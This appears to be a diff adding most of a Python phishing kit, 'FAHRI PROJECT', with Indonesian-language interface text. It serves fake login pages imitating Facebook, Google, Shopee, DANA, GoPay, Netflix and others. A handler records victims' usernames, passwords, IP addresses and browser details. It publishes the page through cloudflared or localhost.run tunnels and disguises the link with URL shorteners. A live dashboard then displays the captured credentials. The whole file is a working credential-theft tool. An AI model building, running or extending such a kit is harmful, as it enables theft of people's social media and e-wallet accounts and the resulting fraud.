+    "2": {"name": "Facebook", "redirect": "https://www.facebook.com/login/", "html": FACEBOOK_HTML, "color": "rgb(24,119,242)"},
+    "3": {"name": "Google", "redirect": "https://accounts.google.com/", "html": GOOGLE_HTML, "color": "rgb(66,133,244)"},
+    "4": {"name": "TikTok", "redirect": "https://www.tiktok.com/login", "html": TIKTOK_HTML, "color": "rgb(254,44,85)"},
+    "5": {"name": "DANA", "redirect": "https://www.dana.id/", "html": DANA_HTML, "color": "rgb(17,142,234)"},
+    "6": {"name": "OVO", "redirect": "https://www.ovo.id/", "html": OVO_HTML, "color": "rgb(76,52,148)"},
+    "7": {"name": "Shopee", "redirect": "https://shopee.co.id/buyer/login", "html": SHOPEE_HTML, "color": "rgb(238,77,45)"},
+    "8": {"name": "GoPay", "redirect": "https://www.gojek.com/gopay/", "html": GOPAY_HTML, "color": "rgb(0,170,19)"},
+    "9": {"name": "WhatsApp", "redirect": "https://web.whatsapp.com/", "html": WHATSAPP_HTML, "color": "rgb(37,211,102)"},
+    "10": {"name": "Netflix", "redirect": "https://www.netflix.com/login", "html": NETFLIX_HTML, "color": "rgb(229,9,20)"},
+}
+
+PWA_SW = """
+self.addEventListener('install', function(e){
+  self.skipWaiting();
+});
+self.addEventListener('activate', function(e){
+  e.waitUntil(self.clients.claim());
+});
+self.addEventListener('fetch', function(e){
+  e.respondWith(fetch(e.request).catch(function(){
+    return new Response('offline', {status: 503});
+  }));
+});
+"""
+
+def _client_ip(handler):
+    for hdr in ("cf-connecting-ip", "x-forwarded-for", "x-real-ip"):
+        val = handler.headers.get(hdr)
+        if val:
+            return val.split(",")[0].strip()
+    try: return handler.client_address[0]
+    except Exception: return "0.0.0.0"
+
+class PhishHandler(BaseHTTPRequestHandler):
+    server_version = "nginx"
+    sys_version = ""
+
+    def log_message(self, fmt, *args): pass
+
+    def _send(self, code, body=b"", ctype="text/html; charset=utf-8"):
+        try:
+            self.send_response(code)
+            self.send_header("Content-Type", ctype)
+            self.send_header("Content-Length", str(len(body)))
+            self.send_header("Cache-Control", "no-store")
+            self.send_header("X-Content-Type-Options", "nosniff")
+            self.end_headers()
+            if body: self.wfile.write(body)
+        except Exception: pass
+
+    def _redirect(self, url):
+        try:
+            self.send_response(302)
+            self.send_header("Location", url)
+            self.send_header("Cache-Control", "no-store")
+            self.end_headers()
+        except Exception: pass
+
+    def do_GET(self):
+        path, _ = parse_request_path(self.path)
+        if path == "/__ping":
+            self._send(200, b"ok", "text/plain")
+            return
+        if path == "/sw.js":
+            self._send(200, PWA_SW.encode(), "application/javascript")
+            return
+        tpl = PHISH_TEMPLATES.get(phish_state.get("active_template", "1"), PHISH_TEMPLATES["1"])
+        if path in ("/login", "/", "/signin", "/accounts/login/", "/auth"):
+            html = tpl["html"].replace("__BASE__", phish_base_style())
+            self._send(200, html.encode())
+            return
+        self._redirect(tpl["redirect"])
+
+    def do_POST(self):
+        path, _ = parse_request_path(self.path)
+        length = int(self.headers.get("Content-Length") or 0)
+        raw = b""
+        try:
+            if length > 0: raw = self.rfile.read(min(length, 65536))
+        except Exception: raw = b""
+        if path == "/__p":
+            data = _safe_json_loads(raw.decode(errors="ignore"), {}) or {}
+            phish_state["creds"].append({
+                "ts": time.time(),
+                "ip": _client_ip(self),
+                "user": str(data.get("u", ""))[:200],
+                "pass": str(data.get("p", ""))[:200],
+                "ua": str(data.get("ua", ""))[:300],
+                "screen": str(data.get("screen", ""))[:40],
+                "lang": str(data.get("lang", ""))[:40],
+                "tz": str(data.get("tz", ""))[:60],
+            })
+            self._send(200, b"{}", "application/json")
+            return
+        self._send(204, b"", "text/plain")
+
+def start_phish_server(port=None):
+    if phish_state["running"]: return True
+    if port is None: port = phish_state.get("port", PHISH_PORT)
+    for attempt in range(3):
+        try:
+            server = ThreadingHTTPServer(("0.0.0.0", port), PhishHandler)
+            server.daemon_threads = True
+            t = threading.Thread(target=server.serve_forever, daemon=True); t.start()
+            phish_state.update({"server":server,"server_thread":t,"running":True,"port":port,"start_ts":time.time()})
+            return True
+        except Exception: time.sleep(0.5)
+    console.print("[bold red]gagal start phishing server[/]"); return False
+
+TUNNEL_URL_PATTERNS = {
+    "cloudflared": r"https://[a-z0-9][a-z0-9-]*\.trycloudflare\.com",
+    "localhostrun": r"https://[a-z0-9][a-z0-9-]*\.(?:lhr\.life|localhost\.run)",
+}
+
+def _ensure_cloudflared():
+    found = shutil.which("cloudflared")
+    if found: return found
+    local_dir = os.path.join(os.path.expanduser("~"), ".fahri")
+    local_bin = os.path.join(local_dir, "cloudflared")
+    if os.path.exists(local_bin) and os.access(local_bin, os.X_OK):
+        try:
+            if os.path.getsize(local_bin) > 1000000: return local_bin
+        except Exception: pass
+    try: os.makedirs(local_dir, exist_ok=True)
+    except Exception: return None
+    machine = (platform.machine() or "").lower()
+    if machine in ("aarch64", "arm64"): arch = "arm64"
+    elif machine in ("armv7l", "armv7", "arm"): arch = "arm"
+    elif machine in ("x86_64", "amd64"): arch = "amd64"
+    elif machine in ("i386", "i686", "x86"): arch = "386"
+    else: return None
+    urls = [
+        f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{arch}",
+        f"https://github.com/cloudflare/cloudflared/releases/download/2024.10.0/cloudflared-linux-{arch}",
+        f"https://github.com/cloudflare/cloudflared/releases/download/2024.8.3/cloudflared-linux-{arch}",
+    ]
+    for url in urls:
+        try:
+            if shutil.which("curl"):
+                subprocess.run(["curl","-fsSL","-o",local_bin,url], timeout=150, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            elif requests_mod:
+                r = requests_mod.get(url, timeout=150, stream=True)
+                with open(local_bin, "wb") as f:
+                    for chunk in r.iter_content(65536):
+                        if chunk: f.write(chunk)
+            else:
+                continue
+            if os.path.exists(local_bin) and os.path.getsize(local_bin) > 1000000:
+                os.chmod(local_bin, 0o755)
+                return local_bin
+        except Exception:
+            continue
+    return None
+
+def _scan_proc_for_url(proc, pattern, timeout=35):
+    q = queue.Queue()
+    def rd(stream):
+        try:
+            for line in iter(stream.readline, b""):
+                try: q.put(line.decode(errors="ignore"))
+                except Exception: q.put(str(line))
+        except Exception:
+            pass
+    for stream in (proc.stdout, proc.stderr):
+        if stream:
+            threading.Thread(target=rd, args=(stream,), daemon=True).start()
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        try: line = q.get(timeout=0.5)
+        except queue.Empty:
+            if proc.poll() is not None: return None
+            continue
+        m = re.search(pattern, line)
+        if m:
+            found_url = m.group(0)
+            if "admin.localhost.run" in found_url:
+                continue
+            return found_url
+    return None
+
+def _verify_tunnel(url, timeout=8, attempts=3):
+    if not requests_mod: return True
+    if "admin.localhost.run" in url: return False
+    base = url.rstrip("/")
+    for i in range(attempts):
+        try:
+            r = requests_mod.get(base + "/__ping", timeout=timeout, verify=False, allow_redirects=True)
+            if r.status_code == 200 and r.text.strip() == "ok":
+                return True
+        except Exception:
+            pass
+        if i < attempts - 1:
+            time.sleep(1.5)
+    return False
+
+def _spawn_logged(cmd, pattern, timeout=35):
+    proc = None
+    try:
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+    except Exception:
+        return None, None
+    url = _scan_proc_for_url(proc, pattern, timeout=timeout)
+    if not url:
+        try: proc.terminate()
+        except Exception: pass
+        try: proc.wait(timeout=3)
+        except Exception:
+            try: proc.kill()
+            except Exception: pass
+        return None, None
+    return url, proc
+
+def _tunnel_cloudflared(port):
+    binary = _ensure_cloudflared()
+    if not binary: return None, None
+    return _spawn_logged(
+        [binary, "tunnel", "--no-autoupdate", "--protocol", "http2",
+         "--edge-ip-version", "4", "--url", f"http://127.0.0.1:{port}"],
+        TUNNEL_URL_PATTERNS["cloudflared"], timeout=50
+    )
+
+def _tunnel_localhostrun(port):
+    if not shutil.which("ssh"): return None, None
+    cmd = ["ssh","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
+           "-o","ServerAliveInterval=25","-o","ServerAliveCountMax=3",
+           "-o","ExitOnForwardFailure=yes","-o","ConnectTimeout=15",
+           "-R",f"80:127.0.0.1:{port}","nokey@localhost.run"]
+    return _spawn_logged(cmd, TUNNEL_URL_PATTERNS["localhostrun"], timeout=40)
+
+TUNNEL_PROVIDERS = [
+    ("cloudflared", _tunnel_cloudflared),
+    ("localhost.run", _tunnel_localhostrun),
+]
+
+def _race_provider(name, fn, port, result_q):
+    try:
+        url, proc = fn(port)
+        if url:
+            result_q.put((name, url, proc))
+    except Exception:
+        pass
+
+def _cleanup_losers(collected, winner_proc):
+    for name, url, proc in collected:
+        if proc is None: continue
+        if winner_proc is not None and proc is winner_proc:
+            spawn_tunnel(proc)
+            continue
+        try: proc.terminate()
+        except Exception: pass
+        try: proc.wait(timeout=3)
+        except Exception:
+            try: proc.kill()
+            except Exception: pass
+
+def get_tunnel_required(port, max_rounds=6):
+    _ensure_cloudflared()
+    for round_idx in range(max_rounds):
+        result_q = queue.Queue()
+        for name, fn in TUNNEL_PROVIDERS:
+            threading.Thread(target=_race_provider, args=(name, fn, port, result_q), daemon=True).start()
+        collected = []
+        winner = None
+        deadline = time.time() + 70
+        while time.time() < deadline:
+            try:
+                item = result_q.get(timeout=1.5)
+            except queue.Empty:
+                if len(collected) >= len(TUNNEL_PROVIDERS):
+                    break
+                continue
+            collected.append(item)
+            name, url, proc = item
+            if _verify_tunnel(url, timeout=8, attempts=3):
+                winner = item
+                break
+        if winner:
+            _cleanup_losers(collected, winner[2])
+            return winner[1], winner[0]
+        _cleanup_losers(collected, None)
+        time.sleep(1.5)
+    return None, None
+
+MASK_CACHE = {}
+MASK_SHORTENERS = [
+    ("is.gd", "https://is.gd/create.php?format=simple&url={}"),
+    ("v.gd", "https://v.gd/create.php?format=simple&url={}"),
+    ("tinyurl", "https://tinyurl.com/api-create.php?url={}"),
+    ("clck.ru", "https://clck.ru/--?url={}"),
+]
+
+def _short_url_ok(url):
+    if not url or not isinstance(url, str): return False
+    url = url.strip()
+    if not url.startswith("http"): return False
+    if len(url) > 100: return False
+    low = url.lower()
+    for bad in ("error","invalid","blocked","denied","not found","exception","try again"):
+        if bad in low: return False
+    return True
+
+def _shorten_via(name, endpoint, long_url):
+    if not requests_mod: return None
+    try:
+        encoded = quote(long_url, safe="")
+        url = endpoint.format(encoded)
+        r = requests_mod.get(url, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
+        if r.status_code != 200: return None
+        text = (r.text or "").strip()
+        if _short_url_ok(text):
+            return text
+        m = re.search(r"https?://[A-Za-z0-9./-]+", text)
+        if m and _short_url_ok(m.group(0)):
+            return m.group(0)
+    except Exception:
+        pass
+    return None
+
+def _verify_short_target(short_url, expected_base):
+    if not requests_mod or not short_url or not expected_base: return True
+    try:
+        r = requests_mod.get(short_url, timeout=8, verify=False, allow_redirects=False, headers={"User-Agent": "Mozilla/5.0"})
+        loc = r.headers.get("Location") or ""
+        if not loc: return True
+        exp_host = urlparse(expected_base).netloc.lower()
+        loc_host = urlparse(loc).netloc.lower()
+        if exp_host and loc_host and exp_host == loc_host:
+            return True
+        if exp_host and exp_host in loc.lower():
+            return True
+    except Exception:
+        pass
+    return True
+
+def mask_link(url):
+    if not requests_mod or not url: return url
+    if url in MASK_CACHE: return MASK_CACHE[url]
+    for name, endpoint in MASK_SHORTENERS:
+        short = _shorten_via(name, endpoint, url)
+        if short:
+            if _verify_short_target(short, url):
+                MASK_CACHE[url] = short
+                return short
+    MASK_CACHE[url] = url
+    return url
+
+def show_brand_menu():
+    clear()
+    hero = Table.grid(expand=True); hero.add_column(justify="center")
+    title_text = Text(); title_text.append("FAHRI PROJECT", style="bold white"); title_text.append("  ::  ", style="bold bright_black"); title_text.append("v1.0.0", style="bold bright_magenta")
+    subtitle_text = Text(); subtitle_text.append("pilih brand phishing", style="dim white")
+    hero.add_row(title_text); hero.add_row(subtitle_text)
+    console.print(Panel(Align.center(hero), border_style="bright_magenta", box=box.DOUBLE_EDGE, padding=(1,4)))
+    tbl = Table(box=box.HEAVY_EDGE, border_style="bright_magenta", title="[bold white on dark_magenta]  AVAILABLE BRANDS  [/]", show_header=True, header_style="bold bright_yellow", expand=True)
+    tbl.add_column("no", style="bold cyan", justify="center", width=5)
+    tbl.add_column("brand", style="bold white")
+    tbl.add_column("deskripsi", style="dim white")
+    for key in sorted(PHISH_TEMPLATES.keys(), key=lambda x: int(x)):
+        t = PHISH_TEMPLATES[key]
+        tbl.add_row(key, f"[bold {t['color']}]{t['name']}[/]", "login capture + tunnel + masked")
+    console.print(tbl)
+
+def run_phish(choice_key):
+    phish_state["active_template"] = choice_key
+    tpl_meta = PHISH_TEMPLATES[choice_key]
+
+    if not try_load_requests():
+        console.print("[bold red]requests unavailable.[/]")
+        console.input("[bold yellow]press enter to return...[/]"); return
+
+    if not start_phish_server():
+        console.input("[bold yellow]press enter to return...[/]"); return
+
+    console.print(f"[bold cyan]membuat tunnel HTTPS ({tpl_meta['name']})...[/]")
+    tunnel_url, tunnel_name = get_tunnel_required(PHISH_PORT)
+    if not tunnel_url:
+        console.print("[bold red]semua provider gagal setelah 6 ronde. Modul phishing dihentikan.[/]")
+        stop_phish_server()
+        console.input("[bold yellow]press enter to return...[/]"); return
+
+    send_link = f"{tunnel_url.rstrip('/')}/login"
+    phish_state["tunnel_url"] = tunnel_url.rstrip("/")
+
+    console.print("[bold cyan]menyamarkan link (instant-redirect shorteners)...[/]")
+    masked_link = mask_link(send_link)
+
+    console.print()
+    console.print(build_info_row([
+        ("BRAND", tpl_meta["name"], f"bold {tpl_meta['color']}"),
+        ("TUNNEL", tunnel_name, "bold bright_green"),
+        ("PORT", PHISH_PORT, "bold bright_cyan"),
+        ("STATUS", "READY", "bold bright_magenta"),
+    ]))
+    if masked_link != send_link:
+        console.print(Panel(Text(masked_link, style="bold bright_green underline"), title="PHISH LINK (MASKED)", border_style="bright_green", box=box.ROUNDED, padding=(0,2)))
+        console.print(Panel(Text(send_link, style="dim white"), title="BACKUP LINK (REAL)", border_style="bright_black", box=box.ROUNDED, padding=(0,1)))
+    else:
+        console.print(Panel(Text(send_link, style="bold bright_green underline"), title="PHISH LINK (HTTPS)", border_style="bright_green", box=box.ROUNDED, padding=(0,2)))
+    console.print("[bold yellow]Kirim link ke target, tekan ENTER untuk mulai monitoring.[/]")
+    console.input()
+
+    try:
+        with Live(console=console, refresh_per_second=30, transient=False) as live:
+            while True:
+                color = PALETTE[int(time.time()*3) % len(PALETTE)]
+                caps = phish_state["creds"]
+                uniq_ip = len(set(c.get("ip") for c in caps))
+                uptime = time.time() - (phish_state.get("start_ts") or time.time())
+                grid = Table.grid(expand=True)
+
+                grid.add_row(build_info_row([
+                    ("BRAND", tpl_meta["name"], f"bold {tpl_meta['color']}"),
+                    ("CAPTURES", len(caps), "bold bright_green"),
+                    ("UNIQ IP", uniq_ip, "bold bright_cyan"),
+                    ("UPTIME", human_time(uptime), "bold bright_yellow"),
+                ]))
+
+                tbl = Table(box=box.DOUBLE_EDGE, border_style=color, title=f"[bold {color}]CAPTURED :: {len(caps)}[/]", show_header=True, header_style="bold bright_yellow", expand=True)
+                tbl.add_column("time", style="bold cyan"); tbl.add_column("ip", style="bold white"); tbl.add_column("user", style="bold green"); tbl.add_column("pass", style="bold yellow")
+                if not caps:
+                    tbl.add_row("(menunggu input dari target)","-","-","-")
+                else:
+                    for c in caps[-14:]:
+                        tbl.add_row(time.strftime("%H:%M:%S", time.localtime(c["ts"])), c.get("ip","?"), c.get("user","") or "", c.get("pass","") or "")
+                grid.add_row(tbl)
+
+                if len(caps) == 0:
+                    share = masked_link if masked_link != send_link else send_link
+                    grid.add_row(Panel(Text(share, style="dim white underline"), border_style="bright_black", box=box.SQUARE, title="[dim]link ready[/]"))
+
+                live.update(grid); time.sleep(0.01)
+    except KeyboardInterrupt: pass
+    finally:
+        kill_all_tunnels(); stop_phish_server()
+        console.input("[bold yellow]press enter to return...[/]")
+
+def main():
+    animated_banner()
+    clear()
+    bootstrap()
+
+    started = start_music_async(); time.sleep(1.4)
+    if started: console.print(Align.center(now_playing_panel()))
+
+    while True:
+        show_brand_menu()
+        try: choice = console.input("\n[bold cyan]select option >> [/]").strip()
+        except (KeyboardInterrupt, EOFError): break
+        if choice in PHISH_TEMPLATES:
+            run_phish(choice); animated_banner()
+        elif choice in ("0","exit","quit"):
+            console.print("[bold red]goodbye.[/]"); break
+        else:
+            console.print("[bold red]pilihan tidak valid, ulangi.[/]"); time.sleep(0.8)
+
+if __name__ == "__main__":
+    try: main()
+    except KeyboardInterrupt:
+        console.print("\n[bold red]interrupted.[/]")
+    finally:
+        try:
+            if music_process and music_process.poll() is None: music_process.terminate()
+        except Exception: pass
+        kill_all_tunnels()
+        try: stop_phish_server()
+        except Exception: pass
